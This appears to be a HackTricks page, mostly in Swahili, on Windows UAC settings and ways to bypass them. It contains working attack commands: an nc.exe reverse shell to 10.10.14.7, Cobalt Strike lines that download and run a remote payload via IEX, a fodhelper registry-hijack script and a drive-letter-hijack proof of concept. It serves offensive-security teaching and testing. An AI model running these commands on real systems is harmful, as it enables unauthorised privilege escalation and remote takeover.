# UAC - Udhibiti wa Akaunti ya Mtumiaji

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **onyo la ridhaa kwa shughuli zilizo na cheo cha juu**. Applications zina `integrity` levels tofauti, na programu yenye **high level** inaweza kutekeleza kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC imewezeshwa, applications na tasks kila mara **huendeshwa chini ya muktadha wa usalama wa akaunti isiyo ya administrator** isipokuwa administrator akauthorizes wazi programu/kazi hizi kupata upatikanaji wa ngazi ya administrator ili ziendeshwe. Ni kipengele cha urahisi kinachowalinda administrators kutokana na mabadiliko yasiyotakiwa lakini hakiwi kuchukuliwa kama mipaka ya usalama.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wakati UAC ipo, mtumiaji wa administrator anapewa tokens 2: token ya mtumiaji wa kawaida, ya kufanya vitendo vya kawaida kwa ngazi ya kawaida, na token moja yenye admin privileges.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi kulingana na shirika lao kwenye kiwango cha local (kwa kutumia secpol.msc), au kusanidiwa na kusambazwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali imeelezewa kwa undani [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna Group Policy settings 10 ambazo zinaweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Baadhi ya programu husababisha **autoelevated automatically** ikiwa **mtumiaji anashiriki** katika **administrator group**. Binaries hizi zina katika _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary pia lazima iwe **imekusainiwa na Microsoft**.

Mchakato nyingi za auto-elevate zinaonyesha **utendakazi kupitia COM objects au RPC servers**, ambazo zinaweza kuitwa kutoka kwa processes zinazoendeshwa kwa medium integrity (privileges za kiwango cha mtumiaji wa kawaida). Kumbuka kuwa COM (Component Object Model) na RPC (Remote Procedure Call) ni mbinu ambazo programu za Windows hutumia kuwasiliana na kutekeleza kazi kati ya processes tofauti. Kwa mfano, **`IFileOperation COM object`** imesanifiwa kushughulikia operesheni za faili (kunakili, kufuta, kuhamisha) na inaweza kuinua privileges bila onyo.

Kumbuka kwamba baadhi ya ukaguzi unaweza kufanywa, kama kukagua ikiwa process ilizinduliwa kutoka kwenye **System32 directory**, ambayo inaweza kupitishwa kwa mfano **kwa kuingiza msimbo ndani ya explorer.exe** au executable nyingine iliyoko System32.

Njia nyingine ya kuepuka ukaguzi huu ni **kubadilisha PEB**. Kila process kwenye Windows ina Process Environment Block (PEB), ambayo inajumuisha data muhimu kuhusu process, kama path ya executable yake. Kwa kubadilisha PEB, watakosefu wanaweza kukuza (spoof) eneo la process yao ya hatari, kuifanya ionekane inatekelezwa kutoka kwenye directory ya kuaminika (kama system32). Taarifa hii ya kuibua huishia kudanganya COM object ili ku-auto-elevate privileges bila kumwuliza mtumiaji.

Kisha, ili **kuepuka** UAC (kuinua kutoka `medium` integrity level hadi `high`) baadhi ya watakosefu hutumia binaries aina hii kutekeleza **arbitrary code** kwa kuwa itatekelezwa kutoka kwa process ya High level integrity.

Unaweza **kukagua** _**Manifest**_ ya binary kwa kutumia chombo _**sigcheck.exe**_ kutoka Sysinternals. (`sigcheck.exe -m <file>`) Na unaweza **kuona** `integrity` level ya processes ukitumia _Process Explorer_ au _Process Monitor_ (za Sysinternals).

### Check UAC

Ili kuthibitisha kama UAC imewezeshwa fanya:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ikiwa ni **`1`** basi UAC imewezeshwa, ikiwa ni **`0`** au haiwepo basi UAC imezimwa.

Kisha, angalia **kiwango gani** kimewekwa:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** basi, UAC haitakuuliza kuthibitisha (kama **imezimwa**)
- If **`1`** msimamizi ataombwa kwa jina la mtumiaji na nenosiri ili kuendesha binary kwa haki za juu (kwenye Desktop Salama)
- If **`2`** (**Always notify me**) UAC itaomba uthibitisho kila wakati kwa msimamizi anapojaribu kuendesha kitu chenye vibali vya juu (kwenye Desktop Salama)
- If **`3`** kama `1` lakini sio lazima kwenye Desktop Salama
- If **`4`** kama `2` lakini sio lazima kwenye Desktop Salama
- if **`5`**(**default**) itaomba msimamizi kuthibitisha kuendesha non Windows binaries kwa haki za juu

Kisha, lazima utazame thamani ya `LocalAccountTokenFilterPolicy`\
Ikiwa thamani ni **`0`**, basi, mtumiaji wa **`RID 500`** (**built-in Administrator**) peke yake anaweza kutekeleza **kazi za admin bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi la "Administrators"** zinaweza kufanya hivyo.

Na, mwisho angalia thamani ya key `FilterAdministratorToken`\
Ikiwa **`0`**(default), akaunti ya **`built-in Administrator`** inaweza kufanya kazi za usimamizi wa mbali na ikiwa **`1`** akaunti ya built-in Administrator **haiwezi** kufanya kazi za usimamizi wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa `1`.

#### Summary

- If `EnableLUA=0` au **haipo**, **hakuna UAC kwa mtu yeyote**
- If `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , hakuna UAC kwa mtu yeyote**
- If `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, hakuna UAC kwa RID 500 (Built-in Administrator)**
- If `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC kwa kila mtu**

Taarifa hizi zote zinaweza kukusanywa kwa kutumia module ya metasploit: `post/windows/gather/win_privs`

Unaweza pia kuangalia vikundi vya mtumiaji wako na kupata ngazi ya uadilifu:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una ufikiaji wa kimuonekano kwa mhanga, UAC bypass ni rahisi kwani unaweza kubofya "Yes" wakati ombi la UAC linapoonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewezeshwa, mchakato wako unafanya kazi katika medium integrity context, na mtumiaji wako ni mwanachama wa administrators group**.

Ni muhimu kutaja kwamba ni **ngumu zaidi kuvuka UAC ikiwa iko katika kiwango cha juu kabisa cha usalama (Always) kuliko ikiwa iko katika mojawapo ya viwango vingine (Default).**

### UAC disabled

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza reverse shell kwa ruhusa za admin** (high integrity level) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Msingi Sana** UAC "bypass" (full file system access)

Iwapo una shell na mtumiaji anayeko ndani ya Administrators group unaweza **mount the C$** shared via SMB (file system) kwa ndani kwenye disk mpya na utakuwa na **access to everything inside the file system** (hata Administrator home folder).

> [!WARNING]
> **Inaonekana hila hii haitumii tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa katika kiwango chake cha juu kabisa cha usalama.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** and **Metasploit** pia zina moduli kadhaa za **bypass** **UAC**.

### KRBUACBypass

Nyaraka na zana ziko kwenye [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa kadhaa za UAC **bypass** exploits. Kumbuka kwamba utahitaji **compile UACME using visual studio or msbuild**. Mchakato wa kujenga utaunda executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni yupi unayehitaji.**\
Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya **bypasses** zitasababisha **kuamsha programu nyingine** ambazo zitatuma **onyo** kwa **mtumiaji** kwamba kuna jambo linaendelea.

UACME ina **build version kutoka ambayo kila technique ilianza kufanya kazi**. Unaweza kutafuta technique inayohusu matoleo yako:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, kwa kutumia [this](https://en.wikipedia.org/wiki/Windows_10_version_history) ukurasa unapopata toleo la Windows `1607` kutoka kwa matoleo ya build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayotegemewa `fodhelper.exe` inajiinua kiotomatiki kwenye Windows za kisasa. Inapoanzishwa, huulizia njia ya registry ya kila mtumiaji hapa chini bila kuthibitisha kitenzi cha `DelegateExecute`. Kuingiza amri hapo kunaruhusu mchakato wa Medium Integrity (mtumiaji yupo katika Administrators) kuzalisha mchakato wa High Integrity bila onyo la UAC.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Hatua za PowerShell (weka payload yako, kisha trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Inafanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC kipo default/lenient (si Always Notify yenye vizuizi vya ziada).
- Tumia njia ya `sysnative` kuanzisha 64-bit PowerShell kutoka kwa process ya 32-bit kwenye 64-bit Windows.
- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au EXE path). Epuka UI zinazotoa prompt kwa ajili ya stealth.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

Kama una ufikiaji wa **GUI** unaweza kukubali tu prompt ya **UAC** unapopokea, huna kweli haja ya bypass. Kwa hivyo, kupata ufikiaji wa GUI kutakuwezesha bypass UAC.

Zaidi ya hayo, ikiwa unapata sesi ya GUI ambayo mtu alikuwa akitumia (labda kupitia **RDP**) kuna **some tools that will be running as administrator** kutoka ambapo unaweza **run** **cmd** kwa mfano **as admin** moja kwa moja bila kuonyeshwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa kidogo zaidi **stealthy**.

### Noisy brute-force UAC bypass

Kama haujali kuhusu kuwa noisy unaweza kuendesha kitu kama [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) kinachoomba ku elevate permissions hadi mtumiaji akubali.

### Your own bypass - Basic UAC bypass methodology

Kama utatizama **UACME** utaona kuwa **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (hasa kuandika dll mabaya kwenye _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary ambayo ita **autoelevate** (angalia kwamba inapofanywa inafanya kazi kwenye high integrity level).
2. Kwa kutumia procmon tafuta matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
3. Huenda utahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) mahali ambapo huna ruhusa za kuandika. Unaweza ku bypass hili kwa kutumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa yaliyomo ya CAB file ndani ya protected paths (kwa sababu zana hii inaendeshwa kutoka high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na utekeleze binary hatarishi na autoelevated.

### Another UAC bypass technique

Inahusu kuangalia kama **autoElevated binary** inajaribu **read** kutoka kwa **registry** jina/path ya **binary** au **command** itakayotekelezwa (hii ni ya kuvutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” inatumia shadow-admin tokens zenye per-session `\Sessions\0\DosDevices/<LUID>` maps. Kielelezo hicho kinarundikwa kwa kuchelewa na `SeGetTokenDeviceMap` wakati wa azimio la kwanza la `\??`. Ikiwa attacker anajifanya shadow-admin token tu katika **SecurityIdentification**, directory inaundwa na attacker kama **owner** (inarithisha `CREATOR OWNER`), ikiruhusu links za drive-letter zinazopitiliza `\GLOBAL??`.

**Steps:**

1. Kutoka kwa sesi yenye ruhusa ndogo, ita `RAiProcessRunOnce` ili kuzalisha promptless shadow-admin `runonce.exe`.
2. Nakili token yake ya msingi kuwa **identification** token na ujaribu kuiga wakati unafungua `\??` kwa kulazimisha uundwaji wa `\Sessions\0\DosDevices/<LUID>` chini ya owner wa attacker.
3. Tengeneza symlink ya `C:` pale ikielekeza kwenye storage inayoendeshwa na attacker; ufikaji wa filesystem unaofuata katika sesi hiyo utaamua `C:` kama path ya attacker, kuwezesha DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Marejeo
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
